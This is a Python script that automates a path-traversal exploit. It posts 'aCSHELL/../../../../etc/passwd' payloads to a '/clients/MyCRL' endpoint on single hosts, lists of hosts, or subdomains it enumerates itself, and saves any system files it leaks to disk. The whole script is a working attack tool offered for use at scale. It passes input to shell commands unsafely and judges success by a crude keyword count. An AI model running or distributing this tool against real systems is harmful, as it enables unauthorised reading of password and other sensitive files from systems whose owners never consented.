import subprocess
import os

# ANSI escape codes for coloring
BLUE = '\033[94m'
ORANGE = '\033[93m'
GREEN = '\033[92m'
RED = '\033[91m'
RESET = '\033[0m'

def check_vulnerability(ip, file_name="etc/passwd"):
    commands = [
        f"curl -i -s -k -X POST \
           -H 'Host: {ip}' \
           -H 'Content-Length: 39' \
           --data-binary 'aCSHELL/../../../../../../../{file_name}' \
           'https://{ip}/clients/MyCRL'",

        f"curl -i -s -k -X POST \
           -H 'Host: {ip}' \
           -H 'Content-Length: 39' \
           --data-binary 'aCSHELL/../../../../../../../{file_name}' \
           --tlsv1.2 \
           'https://{ip}/clients/MyCRL'"
    ]

    # List of keywords to check in the response
    vulnerable_keywords = [
        "root", "admin", "nobody", "bin", "daemon", "sys", "user",
        "password", "shadow", "passwd", "www-data", "mysql", "ftp",
        "httpd", "apache", "nginx", "confidential", "sensitive"
    ]

    for command in commands:
        try:
            output = subprocess.check_output(command, shell=True, text=True)

            # Count the number of keywords found in the output
            keyword_count = sum(1 for word in vulnerable_keywords if word in output)

            # If 14 or more keywords are found, mark as vulnerable
            if keyword_count >= 14:
                print(f"{GREEN}{ip} is vulnerable (found {keyword_count} keywords).{RESET}")
                return "vulnerable", output

            # If less than 14 keywords are found, but certain conditions are met
            if "200 OK" in output or "application/x" in output:
                print(f"{GREEN}{ip} shows signs of vulnerability (found {keyword_count} keywords).{RESET}")
                return "potentially vulnerable", output

        except subprocess.CalledProcessError:
            continue

    print(f"{RED}{ip} is not vulnerable.{RESET}")
    return "not-vulnerable", None

def get_target_ips():
    print(f"{BLUE}Choose an option:{RESET}")
    print("1. Single target")
    print("2. Target from a file")
    print("3. Autoscan target (subdomain enumeration and vulnerability check)")
    choice = input(f"{BLUE}Enter your choice (1/2/3): {RESET} ").strip()

    if choice == "1":
        ip = input(f"{ORANGE}Please enter the IP address: {RESET} ").strip()
        return [ip] if ip else []
    elif choice == "2":
        file_name = input(f"{ORANGE}Please enter the file name (e.g., <target>.txt): {RESET} ").strip()
        try:
            with open(file_name, 'r') as file:
                ips = [ip.strip() for ip in file.readlines() if ip.strip()]
            return ips
        except FileNotFoundError:
            print(f"{RED}Error: The file '{file_name}' was not found.{RESET}")
            return []
    elif choice == "3":
        domain = input(f"{ORANGE}Please enter the domain for subdomain enumeration: {RESET} ").strip()
        if domain:
            return enumerate_subdomains(domain)
        else:
            print(f"{RED}Invalid domain input. Exiting.{RESET}")
            return []
    else:
        print(f"{RED}Invalid choice. Please enter 1, 2, or 3.{RESET}")
        return []

def enumerate_subdomains(domain):
    print(f"{BLUE}Enumerating subdomains for {domain}...{RESET}")
    try:
        subfinder_output = subprocess.check_output(f"subfinder -d {domain} -silent", shell=True, text=True)
        subdomains = subfinder_output.splitlines()

        if not subdomains:
            print(f"{RED}No subdomains found.{RESET}")
            return []

        print(f"{BLUE}Found {len(subdomains)} subdomains. Validating with httprobe...{RESET}")
        valid_domains = []

        total_subdomains = len(subdomains)
        for index, subdomain in enumerate(subdomains):
            try:
                httprobe_output = subprocess.check_output(f"echo {subdomain} | httprobe", shell=True, text=True)
                valid_domains.append(subdomain)
            except subprocess.CalledProcessError:
                continue

            # Calculate and display percentage completion
            percentage = ((index + 1) / total_subdomains) * 100
            print(f"{ORANGE}Validating subdomains: {percentage:.2f}% completed{RESET}")

        if valid_domains:
            print(f"{GREEN}Validation complete: {len(valid_domains)} valid subdomains found.{RESET}")
        else:
            print(f"{RED}No valid subdomains found.{RESET}")

        return valid_domains
    except subprocess.CalledProcessError:
        print(f"{RED}Error occurred during subdomain enumeration or validation.{RESET}")
        return []

def save_vulnerable_target(folder_name, target, output):
    os.makedirs(folder_name, exist_ok=True)

    vuln_file_path = os.path.join(folder_name, f"{target}_vuln.txt")
    with open(vuln_file_path, 'w') as vuln_file:
        vuln_file.write(output)
    print(f"{ORANGE}Vulnerability details saved to {vuln_file_path}{RESET}")

def main():
    folder_name = input(f"{ORANGE}Please enter the folder name to save vulnerability details: {RESET} ").strip()

    ips = get_target_ips()

    if not ips:
        print(f"{RED}No valid IPs or domains to scan. Exiting.{RESET}")
        return

    for ip in ips:
        result, output = check_vulnerability(ip)

        if result == "vulnerable":
            save_vulnerable_target(folder_name, ip, output)

            # Automatic behavior assuming user selects "No" for changing directory
            new_file_name = "etc/passwd"
            result, output = check_vulnerability(ip, new_file_name)
            if result == "vulnerable" and output:
                print(f"With new file name '{new_file_name}':")
                save_vulnerable_target(folder_name, ip, output)

if __name__ == "__main__":
    main()